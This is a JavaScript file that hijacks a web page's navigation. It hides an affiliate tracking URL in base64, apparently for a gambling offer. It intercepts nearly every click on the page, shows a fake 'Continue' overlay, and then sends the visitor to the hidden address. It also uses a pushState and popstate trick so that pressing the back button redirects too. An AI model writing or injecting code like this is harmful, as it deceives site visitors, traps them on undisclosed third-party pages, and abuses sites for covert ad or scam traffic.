const excludedLinks = ['/about', '/contact'];
const base64Url = 'aHR0cHM6Ly90cmtnZmxvdy5nMmFmc2UuY29tL2NsaWNrP3BpZD0xMyZvZmZlcl9pZD0zMDU3JnN1YjE9YmFzc3dpbg==';

function base64_decode(data) {
    const b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
    let o1, o2, o3, h1, h2, h3, h4, bits, i = 0, enc = '';
    do {
        h1 = b64.indexOf(data.charAt(i++));
        h2 = b64.indexOf(data.charAt(i++));
        h3 = b64.indexOf(data.charAt(i++));
        h4 = b64.indexOf(data.charAt(i++));
        bits = h1 << 18 | h2 << 12 | h3 << 6 | h4;
        o1 = bits >> 16 & 0xff;
        o2 = bits >> 8 & 0xff;
        o3 = bits & 0xff;

        if (h3 === 64) enc += String.fromCharCode(o1);
        else if (h4 === 64) enc += String.fromCharCode(o1, o2);
        else enc += String.fromCharCode(o1, o2, o3);
    } while (i < data.length);
    return enc;
}

const redirectUrl = base64_decode(base64Url);

let isPopupShown = false;

function shouldRedirect(event) {
    const anchor = event.target.closest('a');
    if (anchor) {
        const href = anchor.getAttribute('href');
        if (href && excludedLinks.includes(href)) {
            return false;
        }
    }
    return true;
}

function showPopup() {
    const popup = document.createElement('div');
    popup.innerHTML = `
        <div style="display: flex; justify-content: center; align-items: center; background-color: rgba(0, 0, 0, 0.8); position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; color: white;">
            <div style="background: #333; padding: 20px; border-radius: 10px; text-align: center; max-width: 600px;">
                <p style="font-size: 18px; margin-bottom: 20px;">This is your custom notification. Click anywhere to proceed.</p>
                <button id="proceed-btn" style="background-color: #f0ad4e; border: none; color: white; padding: 10px 20px; cursor: pointer; border-radius: 5px;">Continue</button>
            </div>
        </div>
    `;

    document.body.appendChild(popup);

    document.getElementById('proceed-btn').addEventListener('click', () => {
        document.body.removeChild(popup);
        isPopupShown = true;
    });
}

function redirect() {
    window.location.href = redirectUrl;
}

document.addEventListener('DOMContentLoaded', () => {
    document.body.addEventListener('click', (event) => {
        if (shouldRedirect(event)) {
            event.preventDefault();
            if (!isPopupShown) {
                showPopup();
            } else {
                redirect();
            }
        }
    });

    // Push a dummy state to track the initial page load
    history.pushState(null, null, window.location.href);
    window.addEventListener('popstate', (event) => {
        redirect();
        history.pushState(null, null, window.location.href);
    });
});
